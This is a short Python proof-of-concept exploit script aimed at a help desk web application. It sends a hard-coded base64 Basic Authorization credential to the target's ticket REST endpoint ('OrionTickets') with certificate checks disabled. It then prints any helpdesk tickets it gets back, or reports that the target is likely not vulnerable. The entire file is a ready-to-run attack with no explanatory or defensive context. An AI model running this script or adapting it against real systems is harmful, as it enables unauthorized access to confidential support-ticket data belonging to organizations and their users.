#!/usr/bin/python3
import argparse
import requests
import urllib3
import pprint
urllib3.disable_warnings()


def read_helpdesk_tickets(url: str):
    print(f'[*] Attempting to retrieve tickets...')
    h = {'Authorization': 'Basic aGVscGRlc2tJbnRlZ3JhdGlvblVzZXI6ZGV2LUM0RjgwMjVFNw=='}
    r = requests.get(f'{url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets', headers=h, verify=False, timeout=30)
    if r.status_code == 200 and 'shortSubject' in r.text:
        print(f'[*] Successfully read the helpdesk tickets!')
        pprint.pprint(r.json())
    else:
        print(f'[-] Target likely not vulnerable')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL of the target', type=str, required=True)
    args = parser.parse_args()

    read_helpdesk_tickets(args.url)

